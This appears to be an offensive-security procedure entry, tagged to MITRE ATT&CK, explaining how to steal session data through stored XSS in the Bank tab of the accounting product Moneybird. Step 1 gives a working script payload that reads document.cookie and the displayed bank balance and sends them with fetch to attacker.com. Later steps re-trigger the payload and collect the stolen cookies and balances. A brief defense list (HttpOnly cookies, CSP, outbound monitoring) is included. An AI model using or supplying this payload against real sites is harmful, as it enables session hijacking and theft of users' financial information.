---
tags:
  - xss
  - exfiltration
  - session-hijack
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: e0740558-63e0-43a8-88f1-f906d2239204
created_at: '2025-12-14T03:16:25.382Z'
updated_at: '2025-12-14T03:16:25.382Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Exfiltrate-Session-Data-via-XSS

## Summary

This procedure uses the executed XSS payload to capture and exfiltrate sensitive session data, such as cookies or Bank tab financial info, to an attacker-controlled server.

## Description

With JavaScript running in the Bank tab, the payload can access `document.cookie`, localStorage, or DOM elements containing account details. Data is sent via AJAX/fetch to an external endpoint, enabling session hijacking or further attacks on Moneybird users.

## Requirements

1. Executing XSS payload from prior steps
2. Attacker server endpoint (e.g., webhook.site for testing)
3. Payload modified to include exfiltration code

## Defense

Defensive measures and detection strategies:

- HttpOnly and Secure flags on cookies to block JS access
- Monitor outbound network requests from the app
- Rate-limit or block unexpected domains in CSP

## Objectives

1. Capture session and financial data
2. Transmit to attacker
3. Enable follow-on attacks like takeover

## Instructions

### Step 1: Modify Payload for Exfil

**Context**: Update stored payload to include data capture.

Re-inject: `<script>var data = document.cookie + ' | ' + document.querySelector('.bank-balance').textContent; fetch('https://attacker.com/log?data=' + encodeURIComponent(data));</script>`

> Expected: Payload updates in settings.

### Step 2: Re-Trigger Execution

**Context**: Reload Bank tab to run new payload.

Navigate back to Bank tab.

> Expected: Fetch request sent with data.

### Step 3: Receive and Verify Data

**Context**: Check attacker server for incoming payload.

Monitor endpoint logs.

> Expected: Stolen cookies and balances received.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exfiltration Over Command and Control Channel]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Exfiltration]]
- [[session-hijack]]
